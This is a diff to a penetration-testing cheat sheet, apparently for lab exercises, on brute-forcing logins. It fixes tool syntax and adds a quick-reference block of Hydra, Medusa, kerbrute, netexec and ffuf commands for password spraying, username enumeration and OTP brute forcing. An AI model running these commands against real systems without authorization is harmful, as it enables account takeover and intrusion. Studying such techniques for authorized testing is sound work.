@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Automated credential testing against authentication interfaces. Covers Hydra and Medusa for protocols (SSH, FTP, SMB, RDP, HTTP forms), wordlist generation (cupp, CeWL), username enumeration via response analysis, and password spraying to avoid account lockouts.
+Automated credential testing against authentication interfaces. Covers Hydra and Medusa for protocols (SSH, FTP, SMB, RDP, HTTP forms), wordlist generation (cupp, CeWL), username enumeration via response analysis, and password spraying to avoid account lockouts. Pairs with [[Password Attacks]], [[Web Attacks]].
 
 ---
 
@@ -42,7 +42,7 @@ Automated credential testing against authentication interfaces. Covers Hydra and
 | Wordlist | Description |
 |---|---|
 | `/usr/share/wordlists/rockyou.txt` | ~14M leaked passwords from RockYou breach |
-| `/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt` | Top 200 common passwords |
+| `/usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt` | Top 200 common passwords |
 | `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | Common usernames (quick) |
 | `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` | 10M usernames (thorough) |
 | `/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` | Default device credentials |
@@ -78,15 +78,19 @@ cewl https://www.example.com -d 3 -m 5 -w cewl_wordlist.txt
 # Download base list
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt
 
-# Apply policy filters (chain with pipes or step by step)
-grep -E '^.{8,}$' darkweb2017-top10000.txt > filtered.txt          # min 8 chars
-grep -E '[A-Z]' filtered.txt > filtered.txt                          # must have uppercase
-grep -E '[a-z]' filtered.txt > filtered.txt                          # must have lowercase
-grep -E '[0-9]' filtered.txt > filtered.txt                          # must have digit
-grep -E '([!@#$%^&*].*){2,}' filtered.txt > final_wordlist.txt      # 2+ special chars
+# Apply policy filters. NOTE: never do `grep ... file > file` — the shell truncates
+# `file` (via >) BEFORE grep reads it, wiping your list. Pipe, or write a NEW file each step.
 
-# One-liner
-grep -E '^.{8,}$' base.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > filtered.txt
+# One-liner (safe — piped, no in-place clobber)
+grep -E '^.{8,}$' darkweb2017-top10000.txt \
+  | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' \
+  | grep -E '([!@#$%^&*].*){2,}' > final_wordlist.txt
+
+# Step-by-step alternative — write to a different file each time
+grep -E '^.{8,}$' darkweb2017-top10000.txt > f1.txt   # min 8 chars
+grep -E '[A-Z]' f1.txt > f2.txt                        # must have uppercase
+grep -E '[a-z]' f2.txt > f3.txt                        # must have lowercase
+grep -E '[0-9]' f3.txt > final_wordlist.txt            # must have digit
 ```
 
 ---
@@ -193,11 +197,14 @@ medusa -h 10.129.x.x -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
 # FTP
 medusa -h 10.129.x.x -u admin -P passwords.txt -M ftp
 
-# HTTP Basic Auth
-medusa -h 10.129.x.x -u admin -P passwords.txt -M http -m GET:/protected/
+# HTTP Basic Auth (http module: DIR + METHOD are separate -m options)
+medusa -h 10.129.x.x -u admin -P passwords.txt -M http -m DIR:/protected/ -m METHOD:GET
 
-# HTTP POST Form
-medusa -h 10.129.x.x -u admin -P passwords.txt -M web-form -m "FORM:username=&password=:FAIL=Invalid"
+# HTTP POST Form (web-form module: FORM = page, FORM-DATA = method?fields, DENY-SIGNAL = failure text)
+medusa -h 10.129.x.x -u admin -P passwords.txt -M web-form \
+  -m FORM:"login.php" \
+  -m FORM-DATA:"post?username=&password=" \
+  -m DENY-SIGNAL:"Invalid"
 
 # SMB
 medusa -h 10.129.x.x -U users.txt -P passwords.txt -M smbnt
@@ -249,6 +256,8 @@ kerbrute userenum -d inlanefreight.htb --dc 172.16.5.5 users.txt -o valid_users.
 ### CrackMapExec Password Spraying
 
 Safe AD spraying: one password per lockout observation window across all accounts.
+
+> [!note] CrackMapExec is unmaintained — its successor is **netexec** (`nxc`), a drop-in replacement (`nxc smb …` accepts the same flags). Also `-H` takes hash value(s), not a filename — feed hashes inline (`-H <hash>`) or via a wrapper loop, not `-H file.txt`.
 
 ```bash
 # Spray one password across all users
@@ -391,6 +400,36 @@ ffuf -w passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type
 
 ---
 
+## Quick Reference
+
+```bash
+# SSH / FTP single-user
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>
+hydra -l admin -P rockyou.txt ftp://<target>
+
+# HTTP POST form (F = failure string)
+hydra -l admin -P pass.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# AD username enum (quiet — AS-REQ, no 4625)
+kerbrute userenum -d <domain> --dc <dc-ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# AD password spray (lockout-safe: one pw, many users)
+nxc smb <dc-ip> -u users.txt -p 'Welcome1' --continue-on-success
+kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Welcome1'
+
+# Check lockout policy BEFORE spraying
+nxc smb <dc-ip> -u user -p pass --pass-pol
+
+# Web username enum by response size
+ffuf -w users.txt -X POST -d "username=FUZZ&password=x" -u http://<target>/login -fs <invalid_size>
+
+# OTP brute (valid session already held)
+seq -w 000000 999999 > otp.txt
+ffuf -w otp.txt -X POST -d "otp=FUZZ" -H "Cookie: session=<sess>" -u http://<target>/verify-otp -fs <fail_size>
+```
+
+---
+
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
